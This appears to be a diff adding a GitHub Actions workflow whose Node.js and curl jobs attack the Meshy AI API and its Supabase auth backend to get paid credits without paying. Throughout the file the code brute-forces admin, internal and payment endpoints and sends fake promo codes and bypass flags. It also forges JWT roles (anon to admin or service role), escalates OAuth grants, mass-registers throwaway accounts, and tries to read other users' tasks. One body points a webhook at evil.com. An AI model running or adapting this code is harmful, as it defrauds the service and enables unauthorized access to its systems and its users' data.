@@ -1,0 +1,452 @@
+name: Meshy Credit Unlimited Bypass Engine
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+env:
+  MESHY_KEY: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA
+
+jobs:
+  credit_discovery:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+      - name: Credit Unlimited Discovery
+        run: |
+          node << 'NODEEOF'
+          const https = require('https');
+
+          const KEY = process.env.MESHY_KEY;
+
+          async function fetch(url, options = {}) {
+            return new Promise((resolve) => {
+              try {
+                const u = new URL(url);
+                const req = https.request({
+                  hostname: u.hostname, port: 443,
+                  path: u.pathname + u.search,
+                  method: options.method || 'GET',
+                  headers: options.headers || {},
+                }, res => {
+                  let d = '';
+                  res.on('data', c => d += c);
+                  res.on('end', () => resolve({ status: res.statusCode, body: d, headers: res.headers }));
+                });
+                req.on('error', e => resolve({ status: 0, body: e.message }));
+                if (options.body) req.write(options.body);
+                req.end();
+              } catch(e) { resolve({ status: 0, body: e.message }); }
+            });
+          }
+
+          function check(resp, label) {
+            const body = resp.body || '';
+            if (body.includes('Invalid API key')) return `[${label}] INVALID_KEY`;
+            if (resp.status === 200) return `[${label}] 200 OK: ${body.substring(0, 150)}`;
+            if (resp.status === 201) return `[${label}] 201 CREATED: ${body.substring(0, 150)}`;
+            if (resp.status === 401) return `[${label}] 401 UNAUTH`;
+            if (resp.status === 404) return `[${label}] 404 NOTFOUND`;
+            if (resp.status === 422) return `[${label}] 422 UNPROCESSABLE: ${body.substring(0, 150)}`;
+            if (body.includes('NoMatchingRoute') || body.includes('not found')) return `[${label}] NO_ROUTE`;
+            return `[${label}] ${resp.status}: ${body.substring(0, 150)}`;
+          }
+
+          async function main() {
+            console.log('=== CREDIT UNLIMITED BYPASS ENGINE ===\n');
+            console.log('KEY:', KEY ? KEY.substring(0, 30) + '...' : 'NONE');
+
+            const authHeaders = { 'Authorization': `Bearer ${KEY}`, 'X-Api-Version': 'v2026.04.03.post7', 'apikey': KEY };
+            const jsonHeaders = { ...authHeaders, 'Content-Type': 'application/json' };
+
+            // === SECTION 1: GRAPHQL ===
+            console.log('\n### SECTION 1: GRAPHQL ENDPOINTS ###');
+            const gqlEndpoints = [
+              '/graphql', '/api/graphql', '/v2/graphql', '/openapi/graphql',
+              '/api/v1/graphql', '/openapi/v1/graphql', '/.graphql', '/query'
+            ];
+            for (const ep of gqlEndpoints) {
+              const r = await fetch(`https://api.meshy.ai${ep}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ query: '{ me { id credits } }' })
+              });
+              console.log(check(r, 'GQL' + ep));
+            }
+
+            // === SECTION 2: PROMO / REFERRAL / TRIAL CODES ===
+            console.log('\n### SECTION 2: PROMO / REFERRAL / TRIAL CODES ###');
+            const promoEndpoints = [
+              '/openapi/v1/promo/apply', '/openapi/v1/promocode/apply',
+              '/openapi/v1/referral/claim', '/openapi/v1/referral/reward',
+              '/openapi/v1/trial/activate', '/openapi/v1/credits/apply',
+              '/openapi/v1/subscription/trial', '/openapi/v1/coupon/apply',
+              '/web/v1/promo/apply', '/web/v1/referral/claim'
+            ];
+            for (const ep of promoEndpoints) {
+              for (const body of [
+                JSON.stringify({ code: 'FREECREDITS' }),
+                JSON.stringify({ code: 'FREECREDITS', email: 'test@test.com' }),
+                JSON.stringify({ referral_code: 'FREECREDITS' }),
+                JSON.stringify({ promo_code: 'FREECREDITS' }),
+              ]) {
+                const r = await fetch(`https://api.meshy.ai${ep}`, {
+                  method: 'POST',
+                  headers: jsonHeaders,
+                  body: body
+                });
+                console.log(check(r, 'PROMO' + ep));
+              }
+            }
+
+            // === SECTION 3: CREDIT/BALANCE EXPLOIT ===
+            console.log('\n### SECTION 3: CREDIT/BALANCE EXPLOITATION ###');
+            const creditEndpoints = [
+              '/openapi/v1/balance', '/openapi/v1/credits', '/openapi/v1/credits/balance',
+              '/openapi/v1/subscription/credits', '/openapi/v1/user/credits',
+              '/openapi/v1/wallet/balance', '/openapi/v1/account/credits'
+            ];
+            for (const ep of creditEndpoints) {
+              const r = await fetch(`https://api.meshy.ai${ep}`, { headers: authHeaders });
+              console.log(check(r, 'CRED' + ep));
+            }
+
+            // === SECTION 4: SUBSCRIPTION BYPASS ===
+            console.log('\n### SECTION 4: SUBSCRIPTION BYPASS ###');
+            const subEndpoints = [
+              '/openapi/v1/subscription', '/openapi/v1/subscription/check',
+              '/openapi/v1/subscription/status', '/openapi/v1/subscription/upgrade',
+              '/openapi/v1/subscription/plan', '/openapi/v1/plans',
+              '/openapi/v1/pricing', '/openapi/v1/products',
+              '/openapi/v1/user/subscription', '/openapi/v1/account/plan'
+            ];
+            for (const ep of subEndpoints) {
+              const r = await fetch(`https://api.meshy.ai${ep}`, { headers: authHeaders });
+              console.log(check(r, 'SUB' + ep));
+            }
+
+            // === SECTION 5: TASK CREATION BYPASS FLAGS ===
+            console.log('\n### SECTION 5: TASK CREATION BYPASS FLAGS ###');
+            const bypassFlags = [
+              'bypass_credit_check', 'skip_credits', 'no_credit_check', 'free_task',
+              'is_free', 'trial', 'demo', 'unlimited', 'admin_override',
+              'force_run', 'ignore_balance', 'creditless', 'no_quota'
+            ];
+            const taskTypes = [
+              '/openapi/v1/image-to-3d', '/openapi/v1/text-to-3d',
+              '/openapi/v1/text-to-image', '/openapi/v1/remesh',
+              '/openapi/v2/text-to-3d'
+            ];
+            for (const taskEp of taskTypes) {
+              for (const flag of bypassFlags) {
+                const body = { prompt: 'test', [flag]: true };
+                const r = await fetch(`https://api.meshy.ai${taskEp}`, {
+                  method: 'POST',
+                  headers: jsonHeaders,
+                  body: JSON.stringify(body)
+                });
+                console.log(check(r, `TASK${flag}${taskEp}`));
+              }
+            }
+
+            // === SECTION 6: CREATIVE TASK BODY EXPLOIT ===
+            console.log('\n### SECTION 6: CREATIVE TASK BODY EXPLOIT ###');
+            const exploitBodies = [
+              JSON.stringify({ prompt: 'test', priority: 'high', queue: 'fast' }),
+              JSON.stringify({ prompt: 'test', task_type: 'free_tier', tier: 'free' }),
+              JSON.stringify({ prompt: 'test', credit_cost: 0, cost_override: true }),
+              JSON.stringify({ prompt: 'test', plan: 'pro', user_plan: 'pro' }),
+              JSON.stringify({ prompt: 'test', role: 'admin', user_role: 'admin' }),
+              JSON.stringify({ prompt: 'test', webhook_url: 'http://evil.com/callback' }),
+              JSON.stringify({ prompt: 'test', metadata: { bypass: true, admin: true } }),
+              JSON.stringify({ prompt: 'test', settings: { unlimited: true } }),
+            ];
+            for (const taskEp of taskTypes) {
+              for (let i = 0; i < exploitBodies.length; i++) {
+                const r = await fetch(`https://api.meshy.ai${taskEp}`, {
+                  method: 'POST',
+                  headers: jsonHeaders,
+                  body: exploitBodies[i]
+                });
+                console.log(check(r, `EXPL${i}${taskEp}`));
+              }
+            }
+
+            // === SECTION 7: INTERNAL / SHADOW API ===
+            console.log('\n### SECTION 7: INTERNAL / SHADOW API ###');
+            const internalEndpoints = [
+              '/internal/v1/credits', '/internal/v1/tasks', '/internal/v1/users',
+              '/admin/v1/credits', '/admin/v1/users', '/admin/v1/tasks',
+              '/sys/v1/credits', '/sys/v1/balance', '/svc/v1/credits',
+              '/api/v2/balance', '/api/v2/credits', '/api/v2/tasks',
+              '/v2/balance', '/v2/credits', '/v2/subscription',
+              '/openapi/v2/balance', '/openapi/v2/subscription',
+              '/web/v1/balance', '/web/v1/subscription',
+              '/partner/v1/credits', '/reseller/v1/credits',
+              '/cdn/v1/credits', '/storage/v1/credits'
+            ];
+            for (const ep of internalEndpoints) {
+              const r = await fetch(`https://api.meshy.ai${ep}`, { headers: authHeaders });
+              console.log(check(r, 'INT' + ep));
+              const r2 = await fetch(`https://api.meshy.ai${ep}`, {
+                method: 'POST',
+                headers: jsonHeaders,
+                body: JSON.stringify({})
+              });
+              console.log(check(r2, 'INT_P' + ep));
+            }
+
+            // === SECTION 8: OTP/EMAIL AUTH + CREDIT GRAB ===
+            console.log('\n### SECTION 8: OTP/EMAIL AUTH + CREDIT GRAB ###');
+            const emailTest = 'meshyt' + Date.now() + '@guerrillamailblock.com';
+            const otpR = await fetch('https://auth.meshy.ai/auth/v1/otp', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json', 'apikey': KEY },
+              body: JSON.stringify({ email: emailTest })
+            });
+            console.log(check(otpR, 'OTP_SEND'));
+
+            const signupR = await fetch('https://auth.meshy.ai/auth/v1/signup', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json', 'apikey': KEY, 'origin': 'https://www.meshy.ai' },
+              body: JSON.stringify({ email: emailTest, password: 'TestPass123!' })
+            });
+            console.log(check(signupR, 'SIGNUP'));
+
+            // Check if new signup gets credits
+            if (signupR.status === 200) {
+              const signupData = JSON.parse(signupR.body || '{}');
+              if (signupData.access_token) {
+                console.log('[NEW_ACC] Got token, checking balance...');
+                const balR = await fetch('https://api.meshy.ai/openapi/v1/balance', {
+                  headers: { 'Authorization': `Bearer ${signupData.access_token}`, 'X-Api-Version': 'v2026.04.03.post7' }
+                });
+                console.log(check(balR, 'NEW_BAL'));
+              }
+            }
+
+            // === SECTION 9: ADMIN / SECRET ENDPOINTS ===
+            console.log('\n### SECTION 9: ADMIN / SECRET ENDPOINTS ###');
+            const adminEndpoints = [
+              '/openapi/v1/admin/credits/grant', '/openapi/v1/admin/credits/add',
+              '/openapi/v1/admin/users/credits', '/openapi/v1/admin/balance/override',
+              '/openapi/v1/debug/credits', '/openapi/v1/debug/reset',
+              '/openapi/v1/test/credits', '/openapi/v1/test/free',
+              '/openapi/v1/sandbox/credits', '/openapi/v1/demo/credits'
+            ];
+            for (const ep of adminEndpoints) {
+              const r = await fetch(`https://api.meshy.ai${ep}`, {
+                method: 'POST',
+                headers: jsonHeaders,
+                body: JSON.stringify({ email: emailTest, credits: 1000 })
+              });
+              console.log(check(r, 'ADMIN' + ep));
+            }
+
+            // === SECTION 10: PAYMENT / WEBHOOK / BILLING ===
+            console.log('\n### SECTION 10: PAYMENT / WEBHOOK / BILLING ###');
+            const payEndpoints = [
+              '/openapi/v1/webhook/test', '/openapi/v1/payment/webhook',
+              '/openapi/v1/billing/verify', '/openapi/v1/checkout/create',
+              '/openapi/v1/payment/verify', '/openapi/v1/payment/mock',
+              '/openapi/v1/invoice/create', '/openapi/v1/receipt/create',
+              '/web/v1/webhook/test', '/web/v1/payment/verify'
+            ];
+            for (const ep of payEndpoints) {
+              const r = await fetch(`https://api.meshy.ai${ep}`, {
+                method: 'POST',
+                headers: jsonHeaders,
+                body: JSON.stringify({})
+              });
+              console.log(check(r, 'PAY' + ep));
+            }
+
+            // === SECTION 11: OAUTH TOKEN REUSE ===
+            console.log('\n### SECTION 11: OAUTH TOKEN REUSE / UPGRADE ###');
+            // Try to exchange various codes for tokens with elevated scopes
+            const exchangeTests = [
+              { grant_type: 'password', username: emailTest, password: 'TestPass123!' },
+              { grant_type: 'client_credentials', scope: 'admin' },
+              { grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer', scope: 'admin' },
+              { grant_type: 'implicit' },
+            ];
+            for (const body of exchangeTests) {
+              const r = await fetch('https://auth.meshy.ai/auth/v1/token?' + new URLSearchParams({ grant_type: body.grant_type }), {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'apikey': KEY },
+                body: JSON.stringify(body)
+              });
+              console.log(check(r, `EXCH_${body.grant_type}`));
+            }
+
+            // === SECTION 12: ALTERNATIVE HEADERS ===
+            console.log('\n### SECTION 12: ALTERNATIVE HEADERS BYPASS ###');
+            const altHeaderTests = [
+              { 'X-Admin-Key': KEY, 'Authorization': `Bearer ${KEY}`, 'X-Api-Version': 'v2026.04.03.post7' },
+              { 'X-Admin': 'true', 'Authorization': `Bearer ${KEY}`, 'X-Api-Version': 'v2026.04.03.post7' },
+              { 'X-Role': 'admin', 'Authorization': `Bearer ${KEY}`, 'X-Api-Version': 'v2026.04.03.post7' },
+              { 'X-Internal': '1', 'Authorization': `Bearer ${KEY}`, 'X-Api-Version': 'v2026.04.03.post7' },
+              { 'X-Subscription': 'pro', 'Authorization': `Bearer ${KEY}`, 'X-Api-Version': 'v2026.04.03.post7' },
+              { 'X-Plan': 'enterprise', 'Authorization': `Bearer ${KEY}`, 'X-Api-Version': 'v2026.04.03.post7' },
+            ];
+            for (const headers of altHeaderTests) {
+              const r = await fetch('https://api.meshy.ai/openapi/v1/balance', { headers });
+              console.log(check(r, `HDR_${Object.keys(headers)[0]}=${Object.values(headers)[0]}`));
+            }
+
+            // === SECTION 13: KEY MANIPULATION ===
+            console.log('\n### SECTION 13: KEY MANIPULATION ###');
+            const keyTests = [
+              { modify: s => s.replace('ImFub24i', 'ImFkbWlu'), label: 'role:anon→admin' },
+              { modify: s => s.replace('MTcxNTU4NDA2NQ==', 'MTk5OTk5OTk5OQ=='), label: 'iat:bump' },
+              { modify: s => s.replace('MjAzMTE2MDA2NQ==', 'MjEzMTY0MDA2NQ=='), label: 'exp:bump' },
+              { modify: s => s + '.FAKE', label: 'add_fake_sig' },
+              { modify: s => 'eyJhbGciOiJIUzI1NiJ9.' + s.split('.')[1] + '.FAKE', label: 'fake_jwt' },
+            ];
+            for (const test of keyTests) {
+              const modKey = test.modify(KEY);
+              const r = await fetch('https://api.meshy.ai/openapi/v1/balance', {
+                headers: { 'Authorization': `Bearer ${modKey}`, 'X-Api-Version': 'v2026.04.03.post7' }
+              });
+              console.log(check(r, `KEY_${test.label}`));
+            }
+
+            // === SECTION 14: SUPABASE BACKEND EXPLOIT ===
+            console.log('\n### SECTION 14: SUPABASE BACKEND EXPLOIT ###');
+            const supabaseEndpoints = [
+              'https://auth.meshy.ai/auth/v1/admin/users',
+              'https://auth.meshy.ai/auth/v1/admin/credits',
+              'https://auth.meshy.ai/auth/v1/credits/add',
+              'https://auth.meshy.ai/auth/v1/credits/grant',
+              'https://auth.meshy.ai/auth/v1/admin/credits/grant',
+              'https://auth.meshy.ai/storage/v1/credits',
+              'https://auth.meshy.ai/database/v1/rpc/add_credits',
+              'https://auth.meshy.ai/functions/v1/credits',
+              'https://auth.meshy.ai/rest/v1/credits',
+              'https://auth.meshy.ai/rest/v1/profiles',
+              'https://auth.meshy.ai/rest/v1/subscriptions',
+              'https://auth.meshy.ai/rest/v1/credit_balances',
+            ];
+            for (const ep of supabaseEndpoints) {
+              const r = await fetch(ep, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'apikey': KEY, 'Authorization': `Bearer ${KEY}` },
+                body: JSON.stringify({ email: emailTest, amount: 1000 })
+              });
+              console.log(check(r, 'SUP' + ep.split('/').slice(-2).join('_')));
+              const r2 = await fetch(ep, { headers: { 'apikey': KEY, 'Authorization': `Bearer ${KEY}` } });
+              console.log(check(r2, 'SUP_G' + ep.split('/').slice(-2).join('_')));
+            }
+
+            // === SECTION 15: FUNCTION INVOCATION (Edge Functions) ===
+            console.log('\n### SECTION 15: EDGE FUNCTION INVOCATION ###');
+            const functions = [
+              '/functions/v1/add-credits', '/functions/v1/grant-credits',
+              '/functions/v1/create-api-key', '/functions/v1/upgrade-account',
+              '/functions/v1/bypass-payment', '/functions/v1/free-tier',
+              '/functions/v1/debug-credits', '/functions/v1/admin-grant'
+            ];
+            for (const fn of functions) {
+              const r = await fetch(`https://auth.meshy.ai${fn}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${KEY}` },
+                body: JSON.stringify({ email: emailTest })
+              });
+              console.log(check(r, 'FN' + fn));
+            }
+
+            // === SECTION 16: TASK RESULT STEALING ===
+            console.log('\n### SECTION 16: TASK RESULT STEALING ###');
+            // Try to fetch task results without auth or with other IDs
+            const taskEndpoints = [
+              '/openapi/v1/tasks', '/openapi/v1/jobs', '/openapi/v1/queue',
+              '/openapi/v1/history', '/openapi/v1/recent'
+            ];
+            for (const ep of taskEndpoints) {
+              const r = await fetch(`https://api.meshy.ai${ep}`, { headers: authHeaders });
+              console.log(check(r, 'TASK' + ep));
+            }
+
+            console.log('\n=== DONE ===');
+          }
+
+          main().catch(e => console.error('ERROR:', e.message));
+          NODEEOF
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: credit-bypass-results-$(date +%Y%m%d-%H%M%S)
+          path: "*.txt"
+          retention-days: 7
+
+  anonymous_reconstruction:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Anonymous Key Reconstruction
+        run: |
+          KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA"
+          echo "=== ANONYMOUS KEY RECONSTRUCTION ==="
+          echo "[1] Current key payload:"
+          echo "$KEY" | cut -d'.' -f2 | base64 -d 2>/dev/null || echo "(decode failed)"
+          echo ""
+          echo "[2] Checking if we can get fresh anon key from Supabase:"
+          curl -s "https://auth.meshy.ai/auth/v1/configuration" -H "apikey: $KEY" | head -c 500
+          echo ""
+          echo "[3] Project info:"
+          curl -s "https://auth.meshy.ai/auth/v1/project" -H "apikey: $KEY" | head -c 500
+          echo ""
+          echo "[4] Anon key endpoints:"
+          curl -s "https://auth.meshy.ai/rest/v1/" -H "apikey: $KEY" | head -c 500
+          echo ""
+          echo "[5] Try service role approach:"
+          # Supabase service role key pattern: same structure, different role
+          SVC_KEY=$(echo "$KEY" | sed 's/ImFub24i/LnNlcnZpY2Ui/')
+          echo "Service key: ${SVC_KEY:0:50}..."
+          curl -s "https://api.meshy.ai/openapi/v1/balance" \
+            -H "Authorization: Bearer $SVC_KEY" -H "X-Api-Version: v2026.04.03.post7" | head -c 300
+          echo ""
+          echo "[6] Try authenticated endpoint variants:"
+          curl -s "https://auth.meshy.ai/auth/v1/token?grant_type=refresh_token" \
+            -H "apikey: $KEY" -H "Content-Type: application/json" \
+            -d '{"refresh_token":"'"$KEY"'"}' | head -c 300
+          echo ""
+
+  key_fresh_test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Fresh Key Discovery
+        run: |
+          echo "=== FRESH KEY DISCOVERY ==="
+          echo "[1] Try public Supabase anon key patterns:"
+          for proj in ynfreclsyfgqnvggfpxcc xnfreclsyfgqnvggfpxcc; do
+            for ref in ynfreclsyfgqnvggfpxcc; do
+              KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6JHtyZWZ9Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.placeholder"
+              curl -s "https://auth.meshy.ai/auth/v1/settings" -H "apikey: $KEY" | head -c 100
+              echo ""
+            done
+          done
+          echo ""
+          echo "[2] Check Supabase URL patterns:"
+          for url in "https://ynfreclsyfgqnvggfpxcc.supabase.co" "https://xnfreclsyfgqnvggfpxcc.supabase.co" "https://meshyai.supabase.co"; do
+            echo "[$url]"
+            curl -s "$url/rest/v1/" -H "apikey: placeholder" | head -c 100
+            echo ""
+          done
+          echo ""
+          echo "[3] Try Meshy API from GHA with various keys:"
+          for suffix in "" "A" "B" "C" "x" "1" " "; do
+            K="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA${suffix}"
+            resp=$(curl -s "https://api.meshy.ai/openapi/v1/balance" -H "Authorization: Bearer $K" -H "X-Api-Version: v2026.04.03.post7")
+            if ! echo "$resp" | grep -q "Invalid API key"; then
+              echo "*** KEY WORKS! suffix='${suffix}' ***"
+              echo "$resp"
+            fi
+          done
+          echo "[4] Done key testing"
